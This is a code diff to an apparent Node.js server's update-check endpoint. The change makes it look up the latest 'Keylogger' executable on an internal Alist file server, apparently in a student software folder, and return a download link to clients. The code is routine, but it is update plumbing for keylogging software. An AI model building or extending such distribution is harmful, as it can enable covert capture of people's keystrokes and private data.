@@ -1248,66 +1248,63 @@ app.get('/api/clients', (req, res) => {
     res.json(clientManager.getAllClients());
 });
 
-app.get('/api/update/check', (req, res) => {
+app.get('/api/update/check', asyncHandler(async (req, res) => {
     try {
         logger.info('开始检查更新...');
         
-        // 由于 Alist 连接可能失败，这里直接返回默认版本
-        // 实际部署时会从 Alist 检测最新版本
-        const defaultVersion = '1.0.1';
-        const downloadUrl = `http://10.88.202.73:5244/%E5%AD%A6%E7%94%9F%E7%9B%AE%E5%BD%95/%E8%BD%AF%E4%BB%B6/%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8/Keylogger_v${defaultVersion}.exe`;
+        // 从 Alist 获取文件列表
+        const updateDir = '/学生目录/软件/键盘记录器';
+        logger.info(`尝试获取 Alist 目录: ${updateDir}`);
         
-        logger.info(`返回默认版本: ${defaultVersion}, 下载链接: ${downloadUrl}`);
+        let latestVersion = '1.0.1';
+        let downloadUrl = `http://10.88.202.73:5244/%E5%AD%A6%E7%94%9F%E7%9B%AE%E5%BD%95/%E8%BD%AF%E4%BB%B6/%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8/Keylogger_v${latestVersion}.exe`;
+        
+        try {
+            const files = await alistClient.listFiles(updateDir);
+            logger.info(`获取到 ${files.length} 个文件`);
+            
+            // 过滤出 Keylogger 可执行文件并解析版本号
+            const keyloggerFiles = files.filter(file => {
+                const match = file.filename.match(/^Keylogger_v(\d+\.\d+\.\d+)\.exe$/);
+                if (match) {
+                    logger.info(`找到 Keylogger 文件: ${file.filename}, 版本: ${match[1]}`);
+                }
+                return match;
+            });
+            
+            if (keyloggerFiles.length > 0) {
+                // 比较版本号，找出最新版本
+                let tempLatestVersion = '0.0.0';
+                
+                keyloggerFiles.forEach(file => {
+                    const match = file.filename.match(/^Keylogger_v(\d+\.\d+\.\d+)\.exe$/);
+                    if (match) {
+                        const version = match[1];
+                        if (compareVersions(version, tempLatestVersion) > 0) {
+                            tempLatestVersion = version;
+                        }
+                    }
+                });
+                
+                if (tempLatestVersion !== '0.0.0') {
+                    latestVersion = tempLatestVersion;
+                    downloadUrl = `http://10.88.202.73:5244/%E5%AD%A6%E7%94%9F%E7%9B%AE%E5%BD%95/%E8%BD%AF%E4%BB%B6/%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8/Keylogger_v${latestVersion}.exe`;
+                    logger.info(`找到最新版本: ${latestVersion}, 下载链接: ${downloadUrl}`);
+                }
+            }
+        } catch (error) {
+            logger.error('检查 Alist 版本失败，使用默认版本', { error: error.message });
+        }
+        
+        logger.info(`返回版本: ${latestVersion}, 下载链接: ${downloadUrl}`);
         
         res.json({ 
             code: 200, 
             data: { 
-                version: defaultVersion, 
+                version: latestVersion, 
                 download_url: downloadUrl 
             } 
         });
-        
-        // 异步检查 Alist 上的最新版本（不影响响应）
-        (async () => {
-            try {
-                const updateDir = '/学生目录/软件/键盘记录器';
-                logger.info(`尝试获取 Alist 目录: ${updateDir}`);
-                const files = await alistClient.listFiles(updateDir);
-                logger.info(`获取到 ${files.length} 个文件`);
-                
-                // 过滤出 Keylogger 可执行文件并解析版本号
-                const keyloggerFiles = files.filter(file => {
-                    const match = file.filename.match(/^Keylogger_v(\d+\.\d+\.\d+)\.exe$/);
-                    if (match) {
-                        logger.info(`找到 Keylogger 文件: ${file.filename}, 版本: ${match[1]}`);
-                    }
-                    return match;
-                });
-                
-                if (keyloggerFiles.length > 0) {
-                    // 比较版本号，找出最新版本
-                    let latestVersion = '0.0.0';
-                    let latestFile = null;
-                    
-                    keyloggerFiles.forEach(file => {
-                        const match = file.filename.match(/^Keylogger_v(\d+\.\d+\.\d+)\.exe$/);
-                        if (match) {
-                            const version = match[1];
-                            if (compareVersions(version, latestVersion) > 0) {
-                                latestVersion = version;
-                                latestFile = file;
-                            }
-                        }
-                    });
-                    
-                    if (latestFile) {
-                        logger.info(`Alist 上的最新版本: ${latestVersion}`);
-                    }
-                }
-            } catch (error) {
-                logger.error('异步检查 Alist 版本失败', { error: error.message });
-            }
-        })();
         
     } catch (error) {
         logger.error('检查更新失败', { error: error.message });
@@ -1322,7 +1319,7 @@ app.get('/api/update/check', (req, res) => {
             } 
         });
     }
-});
+}));
 
 // 版本号比较函数
 function compareVersions(v1, v2) {
